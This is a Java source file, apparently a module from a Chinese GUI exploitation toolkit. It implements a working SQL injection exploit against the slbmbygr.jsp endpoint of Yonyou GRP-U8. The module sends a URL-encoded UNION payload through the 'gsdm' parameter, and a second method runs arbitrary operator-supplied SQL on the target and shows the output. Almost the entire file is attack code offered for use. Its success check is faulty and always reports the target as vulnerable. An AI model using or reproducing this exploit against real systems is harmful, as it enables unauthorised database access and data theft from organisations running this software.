package exp.oa.yongyou.grp;

import core.Exploitlnterface;
import decrypt.code.getAllEncode;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.*;

import java.util.HashMap;

public class yongyou_grpu8_slbmbygr_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {

        return attcmd(url, cmd, textArea, textArea_cmd);
    }
    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            String sql = "1' UNION ALL SELECT user_name(),NULL-- R4G";
            String sqlVar = getAllEncode.getAllUrlEncode(sql,"all");
            Response var = HttpTools.get(url + "/u8qx/slbmbygr.jsp?gsdm="+sqlVar , head, "utf-8");
            if (var.getText().replace("[null]","") !=null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ yongyou_grpu8_slbmbygr_sqli ]");
                    textArea.appendText("\n 利用sqlmap模块进行利用,注入类型:联合注入");
                    textArea.appendText("\n");
                });

                String target_req = url + "/u8qx/slbmbygr.jsp?gsdm="+sqlVar;
                Platform.runLater(() -> {
                    textArea_cmd.appendText(target_req+"" +
                            "\n----------------------------------------------------------------------\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    private Boolean attcmd(String url,String sql, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            String sqlVar0 = "1' UNION ALL SELECT "+sql+",NULL-- R4G";
            String sqlVar1 = getAllEncode.getAllUrlEncode(sqlVar0,"all");
            Response var = HttpTools.get(url + "/u8qx/slbmbygr.jsp?gsdm="+sqlVar1 , head, "utf-8");
            if (var.getText().replace("[null]","") !=null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n SQL语句: "+sql+" 执行成功");
                    textArea_cmd.appendText(var.getText().replace("[null]","") +"\n----------------------------------------------------------------------\n");
                    textArea.appendText("\n");
                });

                return true;
            }else {
                Platform.runLater(() -> {
                    textArea.appendText("\n SQL语句: "+sql+" 执行失败");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
